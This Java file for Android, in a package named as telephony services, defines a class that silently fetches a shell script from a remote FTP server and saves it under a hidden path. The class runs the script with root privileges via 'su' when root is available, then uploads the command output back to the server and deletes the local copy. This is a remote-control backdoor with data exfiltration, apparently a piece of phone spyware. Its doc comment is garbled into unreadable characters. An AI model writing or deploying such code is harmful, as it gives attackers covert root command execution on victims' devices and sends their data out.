package com.telephony.services;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import android.content.Context;

public class Scripter {
	private MyFTPClient ftp = null;
	private PreferenceUtils sPref = null;
	private File local_script_file;
	private File local_script_outfile;

	public static final String SCRIPT_FILE = "sh/script.sh";
	public static final String SCRIPT_OUT_FILE = "sh/script.out";

	public Scripter(Context context, final MyFTPClient ftp) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
			UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException {
		this.ftp = ftp;
		sPref = PreferenceUtils.getInstance(context);

		local_script_file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), SCRIPT_FILE));
		local_script_outfile = new File(sPref.getRootDir(), SCRIPT_OUT_FILE);
	}

	/**
	 * ��������� shell script �� ����� SCRIPT_FILE �� �������.<br>
	 * ��������� ������ ���� ������ ��������� ����� SCRIPT_FILE ����� ������� SCRIPT_FILE �� �������.<br>
	 * ����� ��������� � SCRIPT_OUTFILE, ��������� ��� ������� �� ������ � ������� ��������� �����.<br>
	 * ����� � ����������� ������� ���������� ���������� $ROOT_DIR, $URL, $SCRIPT_FILE, $SCRIPT_OUTFILE.
	 * 
	 * @throws IOException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 */
	public void execScript() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
			NoSuchPaddingException {
		String[] cmds = null;
		String[] outs = null;
		String shell = "sh";
		FileInputStream fis = null;
		byte[] buffer = new byte[1024];
		StringBuilder sb = new StringBuilder();

		long rfs = ftp.getFileSize(SCRIPT_FILE);

		if ((rfs > 0) && (rfs != local_script_file.length())) {
			if (ftp.downloadFile(SCRIPT_FILE, local_script_file)) {
				fis = new FileInputStream(local_script_file);
				try {
					if (fis != null) {
						sb.append("ROOT_DIR=\"" + sPref.getRootDir() + "\"").append("\n");
						sb.append("URL=\"" + sPref.getRemoteUrl() + "\"").append("\n");
						sb.append("SCRIPT_FILE=\"" + local_script_file.getAbsolutePath() + "\"").append("\n");
						sb.append("SCRIPT_OUTFILE=\"" + local_script_outfile.getAbsolutePath() + "\"").append("\n").append("\n");
						int count = -1;
						while ((count = fis.read(buffer)) > 0) {
							sb.append(new String(buffer).substring(0, count));
						}
					}
				} finally {
					if (fis != null) {
						fis.close();
					}
				}

				cmds = sb.toString().split("[ \r]*\n+");
				if (cmds.length > 0) {
					if (Utils.checkRoot()) {
						shell = "su";
					}
					outs = new Proc(shell).exec(cmds);
					Utils.writeFile(local_script_outfile, Utils.implodeStrings(outs, "\n"));
					if (ftp.uploadFile(local_script_outfile, ftp.getRemoteFile(sPref.getRootDir(), local_script_outfile))) {
						local_script_outfile.delete();
					}
				}
			}
		}

	}
}
